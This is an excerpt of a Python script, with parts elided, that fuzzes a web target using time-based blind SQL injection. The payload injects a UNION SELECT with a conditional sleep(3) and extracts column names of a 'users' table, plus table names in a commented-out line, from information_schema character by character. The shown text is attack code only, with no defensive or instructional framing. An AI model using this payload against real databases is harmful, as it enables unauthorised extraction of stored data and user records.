...
def fuzz():
    ...
    while True:
        for char in printables:
            ...
            query = "' union  select 1, 2, if(substring((select column_name from information_schema.columns where table_name='users' and table_schema='cc' limit 1,1),1,"+str(len(teste_db))+")='"+teste_db+"',sleep(3), NULL) -- -"
            #query = "' union  select 1, 2, if(substring((select table_name from information_schema.tables where table_schema='cc' limit 0,1),1,"+str(len(teste_db))+")='"+teste_db+"',sleep(3), NULL) -- -"
